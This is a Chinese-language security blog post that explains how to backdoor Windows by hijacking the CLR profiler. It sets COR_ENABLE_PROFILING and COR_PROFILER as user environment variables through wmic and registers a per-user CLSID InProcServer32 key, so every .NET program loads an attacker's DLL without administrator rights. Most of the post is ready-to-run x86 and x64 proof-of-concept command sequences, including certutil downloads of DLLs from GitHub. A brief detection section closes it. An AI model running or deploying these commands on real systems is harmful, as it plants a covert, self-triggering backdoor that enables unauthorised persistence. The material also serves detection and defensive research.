---
layout: post
title: Use CLR to maintain persistence
---

## 0x00 前言
---

在之前的文章[《Use AppDomainManager to maintain persistence》](https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/)介绍了通过AppDomainManager实现的一种被动后门触发机制，演示了如何劫持系统.Net程序powershell_ise.exe，但前提是需要获得管理员权限。
这一次将更进一步，介绍一种无需管理员权限的后门，并能够劫持所有.Net程序。

## 0x01 简介
---

本文将要介绍以下内容：

- CLR的使用
- 后门开发思路
- POC编写
- 后门检测


## 0x02 CLR的使用
---

**CLR：**

全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。

CLR是.NET Framework的主要执行引擎，作用之一是监视程序的运行：

- 在CLR监视之下运行的程序属于“托管的”（managed）代码
- 不在CLR之下、直接在裸机上运行的应用或者组件属于“非托管的”（unmanaged）的代码

**CLR的使用：**

测试系统： Win8 x86

### 1、启动cmd

输入如下代码：

```
SET COR_ENABLE_PROFILING=1
SET COR_PROFILER={11111111-1111-1111-1111-111111111111}
```

**注：**

`{11111111-1111-1111-1111-111111111111}`表示CLSID

可设置为任意数值，只要不和系统常用CLSID冲突就好

### 2、测试dll

使用弹框dll，下载地址：

https://raw.githubusercontent.com/3gstudent/test/master/msg.dll

dll开发过程可参考：

https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/

可在cmd下实现直接下载，代码如下：

```
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete
```

操作如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/2-1.png)

**注：**

delete是为了清除下载文件的缓存

更多关于使用certutil.exe下载文件的利用细节可参考文章：

[《渗透测试中的certutil.exe》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84certutil.exe/)

### 3、操作注册表

注册表路径：`HKEY_CURRENT_USER\Software\Classes\CLSID\`

新建子项`{11111111-1111-1111-1111-111111111111}`，同步骤1 cmd输入的CLSID对应
新建子项`InProcServer32`
新建键值`REG_SZ ThreadingModel：Apartment`
默认路径改为msg.dll的路径

修改后的注册表如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/2-2.png)

对应cmd代码如下：

```
SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
```

### 4、在当前cmd启动.net程序

例如powershell.exe，启动时加载msg.dll，弹框

操作如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/2-3.png)

**注:**

使用其他cmd执行powershell.exe不会加载msg.dll

**原因：**

```
SET COR_ENABLE_PROFILING=1
SET COR_PROFILER={11111111-1111-1111-1111-111111111111}
```

只作用于当前cmd，可通过cmd命令`"set"`判断


当然，执行其他.net程序也会加载msg.dll

测试如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/2-4.png)


## 0x03 后门开发思路
---

由以上测试得出结论，使用CLR能够劫持所有.Net程序的启动，但是只能作用于当前cmd

能否作用于全局呢？

自然想到了修改环境变量

通常，修改环境变量使用面板操作的方式，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/3-1.png)

能否通过命令行修改环境变量呢？

自然想到了WMI

修改系统变量（需要管理员权限）：

`wmic ENVIRONMENT create name="1",username="<system>",VariableValue="1"`

修改当前用户变量（当前用户权限）：

`wmic ENVIRONMENT create name="2",username="%username%",VariableValue="2"`

**注：**

通过WMI修改环境变量需要系统重启或注销重新登录才能生效


接下来需要测试，是否只需要修改当前用户权限就能够实现作用于全局，答案是肯定的。

添加当前用户的环境变量：

```
wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"

wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
```

重启后，成功修改，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/3-2.png)

现在直接启动.Net程序，弹框，成功加载msg.dll

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/3-3.png)

至此，后门思路验证成功


## 0x04 POC编写
---

对于32位操作系统，参考0x03的代码就好，x86 POC如下：

```
wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"
wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete
SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
```


对应64位系统，需要注意重定向问题，注册表存在32位和64位两个位置

**注:**

更多关于64位系统的重定向细节可参考文章《关于32位程序在64位系统下运行中需要注意的重定向问题》


结合到本文，32位需要对应32位的dll，64位对应64位的dll

所以，需要准备64位的dll，下载地址如下：

https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll

过程不再赘述，64位POC如下：

```
wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"
wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll delete
SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg_x64.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F 
SET KEY=HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
```

能够分别劫持32位和64位的.Net程序，完整测试如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/CLR-Injection/master/poc.gif)

**注：**

更多代码细节可见github，地址如下：

https://github.com/3gstudent/CLR-Injection

## 0x05 后门检测
---

结合利用方式，检测方法如下：

- 检查环境变量`COR_ENABLE_PROFILING`和`COR_PROFILER`
- 检查注册表键值`HKEY_CURRENT_USER\Software\Classes\CLSID\`

## 0x06 小结
---

本文介绍了通过CLR劫持.Net程序的后门，特点是无需管理员权限，并能够劫持所有.Net程序。更重要的是,系统默认会调用.net程序,导致后门自动触发。

## 0x07 补充(20171023)

Stefan Kanthak发现了这种利用方法，并且公开的时间比我要早，地址如下：

http://seclists.org/fulldisclosure/2017/Jul/11

并且，他利用CLR还实现了UAC绕过(这个思路我是后来从clem@clavoillotte的博客学到的)，该方法我也做了研究并写了一篇研究心得，地址如下：

[《Use CLR to bypass UAC》](https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-bypass-UAC/)

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)


